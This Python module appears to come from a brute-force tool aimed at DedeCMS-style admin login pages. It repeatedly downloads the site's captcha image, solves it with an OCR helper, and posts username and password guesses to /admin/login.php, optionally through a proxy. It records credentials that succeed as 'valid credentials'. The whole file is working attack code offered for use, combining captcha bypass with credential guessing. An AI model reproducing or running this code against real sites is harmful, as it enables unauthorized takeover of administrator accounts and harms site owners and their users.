import requests
import threading
import re
from lib.log import MyLogger
from lib.Identification_vercode import image_str

def save_img(bytes):
    with open("data/vdimgck.png", "wb") as f:
        f.write(bytes)

threadingLock = threading.Lock()
def run(items):
    url,user_agent,proxy,username, password=items
    vdcode = ""
    url=url.strip("/")
    logurl=url+'/admin/login.php'
    header = {'User-Agent': user_agent}

    sesion = requests.session()
    for i in range(9):
        #获取验证码
        try:
            while len(vdcode) < 4:
                if proxy:
                    proxies = {
                        "http": "http://%(proxy)s/" % {'proxy': proxy},
                        "https": "http://%(proxy)s/" % {'proxy': proxy}
                    }
                    bytes_img = sesion.get(url+"/include/vdimgck.php", headers=header, proxies=proxies, timeout=5)
                else:
                    bytes_img = sesion.get(url+"/include/vdimgck.php", headers=header, timeout=5)
                bytes_img=bytes_img.content
                save_img(bytes_img)
                vdcode=image_str("data/vdimgck.png")
        except Exception as error:
            MyLogger.error(error)

        data = {
            "gotopage":'',
            "dopost":"login",
            "userid": username,
            "pwd": password,
            "validate": vdcode,
            "input_sub":''
        }

        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = sesion.post(logurl, headers=header, data=data, proxies=proxies, timeout=5)
        else:
            response = sesion.post(logurl, headers=header, data=data, timeout=5)

        if response.status_code == 200 and "成功登录，正在转向管理管理主" in response.text:
            break
    # print(loginResult)
    threadingLock.acquire()
    print(u'\r[#] 正在尝试凭据：'+username+"    "+password+' '*10,end='')
    # MyLogger.debug("正在尝试凭据："+username+" "+password)
    if response.status_code==200 and "成功登录，正在转向管理管理主" in response.text:
        MyLogger.success("有效凭据："+username+" "+password)
        threadingLock.release()
        return {username:password}
    else:
        print(u'\r[#] 无效凭据：' + username + "    " + password+' '*10, end='')
        # MyLogger.debug("无效凭据："+username+" "+password)
        threadingLock.release()





